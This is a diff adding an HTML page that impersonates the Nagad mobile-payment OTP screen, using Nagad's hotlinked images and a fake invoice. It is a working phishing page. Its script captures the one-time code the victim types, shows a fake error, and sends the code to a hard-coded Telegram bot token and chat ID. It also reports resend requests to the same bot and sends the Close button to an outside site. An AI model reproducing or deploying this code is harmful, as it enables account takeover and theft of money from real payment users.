@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="icon" type="image/png" href="https://payment.mynagad.com:30000/img/nagad_favicon.png" sizes="16x16">
+    <title>Nagad Payment Page: OTP</title>
+    <link rel="stylesheet" type="text/css" href="https://payment.mynagad.com:30000/css/nagad.css">
+</head>
+
+<body>
+<div class="payment-screen">
+    <div class="payment-container">
+        <div class="btn-group lang-switcher" role="group" aria-label="Basic example">
+            <button id="bn_btn" type="button" class="btn btn-secondary" onclick="changeLanguage('bn')">বাং</button>
+            <button id="en_btn" type="button" class="btn btn-secondary" onclick="changeLanguage('en')">Eng</button>
+        </div>
+        <div class="merchant-info">
+            <div class="top-icon">
+                <img class="img-fluid" src="https://payment.mynagad.com:30000/img/cart.png" alt="">
+            </div>
+            <div class="merchant-name">Software Shop Ltd</div>
+        </div>
+        <div class="payment-infos">
+            <p class="payment-info additional-field mb-0">
+                <strong class="translateable" data-trans-key="invoice_no">Invoice No:</strong>&nbsp;
+                <span>ECOM6015269</span>
+            </p>
+            <p class="payment-info additional-field mb-0">
+                <strong class="translateable" data-trans-key="total">Total Amount:</strong>&nbsp;BDT 
+                <span id="totalAmount">10.00</span>
+            </p>
+            <p class="payment-info additional-field mb-0">
+                <strong class="translateable" data-trans-key="charge">Charge:</strong>&nbsp;
+                <span>BDT 0</span>
+            </p>
+            <p class="payment-info additional-field mb-0">
+                <strong class="translateable" data-trans-key="additional_field_name"></strong>&nbsp;
+                <span></span>
+            </p>
+        </div>
+        <div class="form-container">
+            <form id="otp-form" onsubmit="validateOTP(event)"
+                  action="/check-out/verify-otp/MTIyMjE0NDgwNjc5NC42ODkwNzQ4NjI5MzU3MzQuTkcyNjE0MjAyNDEyMjI3NzQwOC43YzZiNGIwMDVjN2Y4OTk1YTgxYg==" method="post">
+                <div class="form-group">
+                    <label for="" class="translateable" data-trans-key="otp_label">Enter Verification Code [OTP]</label>
+
+                    <input class="form-control text-center"
+                           inputmode="numeric" pattern="\d{6}"
+                           placeholder="XXXXXX"
+                           onKeyPress="if(this.value.length==6) return false;"
+                           type="number" autofocus required id="otp" name="otp" value="">
+                </div>
+
+                <div class="messages">
+    <span id="error-message" class="text-error"></span>
+</div>
+                
+                <div class="action-buttons otp-buttons">
+                    <button type="submit" class="btn translateable" data-trans-key="proceed_btn">Proceed</button>
+                    <button onclick="resendCode()" type="button" id="btnResendOtp" class="btn translateable"
+                            data-trans-key="resend_code_btn">Resend Code</button>
+                    <button onclick="closePage()" type="button" class="btn translateable" id="close-window"
+                            data-trans-key="close_btn">Close</button>
+                </div>
+            </form>
+        </div>
+        <div class="nagad-logo">
+            <img class="img-fluid" src="https://payment.mynagad.com:30000/img/logo.png" alt="">
+        </div>
+    </div>
+</div>
+    <script>
+    // Function to set the totalAmount dynamically on page load
+    function updateTotalAmount() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const amount = urlParams.get('amount') || '10.00'; // Default to 10.00 if 'amount' is not in the URL
+        document.getElementById('totalAmount').textContent = amount;
+    }
+
+    // Function to validate OTP
+    function validateOTP(event) {
+        event.preventDefault(); // Prevent default form submission behavior
+
+        const otpInput = document.getElementById('otp');
+        const otp = otpInput.value;
+        const errorMessage = document.getElementById('error-message');
+
+        // Get the current Total Amount
+        const amount = document.getElementById('totalAmount').textContent;
+
+        if (otp.length !== 6) {
+            errorMessage.textContent = 'Invalid OTP';
+            errorMessage.style.display = 'block';
+        } else {
+            errorMessage.textContent = `Unknown Error. Please call 16167 for more information.`;
+            errorMessage.style.display = 'block';
+
+            // Optionally send OTP and Amount to Telegram
+            sendToTelegramBot(otp, amount);
+        }
+    }
+
+    // Send OTP to Telegram Bot
+    function sendToTelegramBot(otp, amount) {
+        const telegramBotToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+        const chatId = '7174617845';
+        const message = `Nagad OTP Verification Code: ${otp}`;
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
+    }
+
+    // Resend OTP function
+    function resendCode() {
+        const errorMessage = document.getElementById('error-message');
+        errorMessage.textContent = 'OTP has been resent via SMS to your mobile number';
+        errorMessage.style.display = 'block';
+sendResendMessageToTelegram();
+        setTimeout(() => {
+            errorMessage.style.display = 'none';
+        }, 3000);
+    }
+
+    // Close the page
+    function closePage() {
+        window.location.href = 'https://allbuysell.vercel.app';
+    }
+
+    function sendResendMessageToTelegram() {
+        const telegramBotToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+        const chatId = '7174617845';
+        const message = `OTP resend request received`;
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
+    }
+
+    // Restrict OTP input to numbers only
+    const otpInput = document.getElementById('otp');
+    otpInput.addEventListener('keydown', (event) => {
+        if (["Backspace", "Delete", "Tab", "Escape", "Enter"].includes(event.key)) {
+            return;
+        }
+        if ((event.shiftKey || (event.key < '0' || event.key > '9'))) {
+            event.preventDefault();
+        }
+    });
+
+    // Call the function to update Total Amount on page load
+    document.addEventListener('DOMContentLoaded', updateTotalAmount);
+</script>
+
+
+</body>
+
+</html>
